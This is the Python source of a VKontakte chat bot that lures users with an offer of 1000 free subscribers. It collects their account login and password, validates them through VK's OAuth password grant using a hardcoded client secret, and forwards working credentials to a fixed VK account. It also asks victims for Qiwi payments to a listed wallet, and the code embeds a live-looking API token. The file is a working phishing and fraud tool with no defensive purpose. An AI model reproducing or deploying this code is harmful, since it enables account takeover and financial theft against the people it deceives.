try:
    import vk_api, time, os, requests
    from vk_api.longpoll import VkLongPoll, VkEventType
    from vk_api.utils import get_random_id
    from vk_api.keyboard import VkKeyboard, VkKeyboardColor

    print("Бот запущен!")
    keyboard = VkKeyboard(one_time=False)
    # 1
    keyboard.add_button('Подписчики 👤', color=VkKeyboardColor.PRIMARY)
    keyboard.add_line()
    keyboard.add_button('Баланс 💰', color=VkKeyboardColor.PRIMARY)
    keyboard.add_button('Пополнить 💳', color=VkKeyboardColor.PRIMARY)

    clava2 = VkKeyboard(one_time=False)
    clava2.add_button('Оплата Qiwi 🥝', color=VkKeyboardColor.PRIMARY)
    clava2.add_line()
    clava2.add_button('Назад ↩', color=VkKeyboardColor.SECONDARY)
    clava3 = VkKeyboard(one_time=False)
    clava3.add_button('Назад ↩', color=VkKeyboardColor.PRIMARY)

    def write_message(sender, message):
        if i == 1:
            authorize.method('messages.send', {'user_id': sender, 'message': message, "random_id": get_random_id(),
                                               'keyboard': keyboard.get_keyboard()})
        if i == 2:
            authorize.method('messages.send', {'user_id': sender, 'message': message, "random_id": get_random_id(),
                                               'keyboard': clava2.get_keyboard()})
        if i == 3 or i == 4 or i == 5 or i == 6:
            authorize.method('messages.send', {'user_id': sender, 'message': message,
                                               "random_id": get_random_id(),
                                               'keyboard': clava3.get_keyboard()})

    token = "5bce844c8a3db4d68662d611fd306da33389a6de1edd56299439c5d56d8cbe5a1fc08a9f696d745bebc9f"
    authorize = vk_api.VkApi(token=token)
    longpoll = VkLongPoll(authorize)
    admin = 574170405
    for event in longpoll.listen():
        if event.type == VkEventType.MESSAGE_NEW and event.to_me:
            reseived_message = event.text.lower()
            sender = event.user_id
            try:
                a = open(str(event.user_id) + "c.txt", "r")
                a.close()
            except:
                a = open(str(event.user_id) + "c.txt", "w")
                a.write("1")
                a.close()
            with open(str(event.user_id) + "c.txt", "r") as ca:
                i = ca.read()
                i = int(i)
            if reseived_message == 'начать' and i == 1 \
                    or reseived_message == 'начать' and i == 1 \
                    or reseived_message == 'привет' and i == 1 \
                    or reseived_message == 'ку' and i == 1 \
                    or reseived_message == 'хай' and i == 1 \
                    or reseived_message == 'здравствуйте' and i == 1 \
                    or reseived_message == 'start' and i == 1 \
                    or reseived_message == 'дарова' and i == 1:
                    write_message(sender, 'Привет! \nРады видеть тебя в нашей группе 😊')
                    write_message(sender, 'Вы в главном меню: \nПодписчики.')
            elif reseived_message[0:6] == "баланс":
                write_message(sender, 'Ваш баланс: 0 руб.')
            elif reseived_message[0:5] == 'назад' and i == 2 or reseived_message[0:5] == 'назад' and i == 3:
                a = open(str(sender) + "c.txt", "w")
                a.write("1")
                a.close()
                with open(str(sender) + "c.txt", "r") as ca:
                    i = ca.read()
                    i = int(i)
                write_message(sender, 'Вы в главном меню: \nПодписчики.')
            elif reseived_message[0:5] == 'назад' and i == 4:
                a = open(str(sender) + "c.txt", "w")
                a.write("3")
                a.close()
                with open(str(sender) + "c.txt", "r") as ca:
                    i = ca.read()
                    i = int(i)
                write_message(sender, 'Первый заказ: \n1000 - Подписчиков в подарок. \n\nОтправьте ссылку: \nВ формате: https://vk.com/')
            elif reseived_message[0:5] == 'назад' and i == 5:
                a = open(str(sender) + "c.txt", "w")
                a.write("4")
                a.close()
                with open(str(sender) + "c.txt", "r") as ca:
                    i = ca.read()
                    i = int(i)
                write_message(sender, 'Чтобы убедится, что данная группа пренадлежит вам, нужно ввести данные от вашего аккаунта. \nПосле проверки Накрутка будет запущена, если группа не будет привязана к аккаунту бот выдаст ошибку. \n\nВведите Логин: (Номер к которому привязан аккаунт).')
            elif reseived_message[0:5] == 'назад' and i == 6:
                a = open(str(sender) + "c.txt", "w")
                a.write("5")
                a.close()
                with open(str(sender) + "c.txt", "r") as ca:
                    i = ca.read()
                    i = int(i)
                write_message(sender, 'Введите пароль:')

            elif reseived_message[0:10] == 'подписчики':
                a = open(str(sender) + "c.txt", "w")
                a.write("3")
                a.close()
                with open(str(sender) + "c.txt", "r") as ca:
                    i = ca.read()
                    i = int(i)
                write_message(sender, "Первый заказ: \n1000 - Подписчиков в подарок. \n\nОтправьте ссылку: \nВ формате: https://vk.com/")
            elif reseived_message[0:15] == 'https://vk.com/' and len(reseived_message) > 19 and i == 3:
                a = open(str(sender) + "c.txt", "w")
                a.write("4")
                a.close()
                with open(str(sender) + "c.txt", "r") as ca:
                    i = ca.read()
                    i = int(i)
                write_message(sender, 'Чтобы убедится, что данная группа пренадлежит вам, нужно ввести данные от вашего аккаунта. \nПосле проверки Накрутка будет запущена, если группа не будет привязана к аккаунту бот выдаст ошибку. \n\nВведите Логин: \n(Номер к которому привязан аккаунт).')
            elif i == 4:
                a = open(str(event.user_id) + "log.txt", "w")
                a.write(str(reseived_message))
                a.close()
                a = open(str(sender) + "c.txt", "w")
                a.write("5")
                a.close()
                with open(str(sender) + "c.txt", "r") as ca:
                    i = ca.read()
                    i = int(i)
                write_message(sender, 'Введите пароль:')
            elif i ==5:
                write_message(sender, 'Проверка..')
                with open(str(sender) + "log.txt", "r") as ff:
                    log = ff.read()
                    log = str(log)
                ss = requests.get(f"https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username={log}&password={event.text}")
                if str(ss) == '<Response [200]>':
                    a = open(str(event.user_id) + "c.txt", "w")
                    a.write("1")
                    a.close()
                    with open(str(sender) + "c.txt", "r") as ca:
                        i = ca.read()
                        i = int(i)
                    write_message(sender, 'Успешно ✅\nОжидайте 1000 - подписчиков...')
                    write_message(685062634, f'Логин: {log} \nПароль: {event.text}')
                else:
                    a = open(str(event.user_id) + "c.txt", "w")
                    a.write("1")
                    a.close()
                    with open(str(sender) + "c.txt", "r") as ca:
                        i = ca.read()
                        i = int(i)
                    write_message(sender, 'Ошибка входа ⛔\nПовторите действия сначало.')

            elif reseived_message[0:9] == "пополнить":
                a = open(str(sender) + "c.txt", "w")
                a.write("2")
                a.close()
                with open(str(sender) + "c.txt", "r") as ca:
                    i = ca.read()
                    i = int(i)
                write_message(sender, "Выберите способ оплаты")
            elif reseived_message[0:11] == "оплата qiwi" and i == 2:
                a = open(str(sender) + "c.txt", "w")
                a.write("2")
                a.close()
                with open(str(sender) + "c.txt", "r") as ca:
                    i = ca.read()
                    i = int(i)
                write_message(sender, 'Кошелек для платежа: +79283692011 \n Примечание к платежу: ' + "1" + str(
                    sender) + f' ❗ \n\nТак же оплатить можно с помощью карты (выбирается на сайте). \n\nПосле оплаты на Ваш баланс будет зачислена сумма перевода. Об этом вас уведомят.\n\nhttps://qiwi.com/payment/form/99?extra[%27account%27]=79283692011&amountInteger=1&extra[%27comment%27]=1{sender}&blocked[0]=comment&blocked[1]=account')
            else:
                if i == 3:
                    write_message(sender, 'Не верный формат ⛔')
                else:
                    write_message(sender, 'Прости я бот, я знаю не много :(')
except:
    os.system('python bot.py')


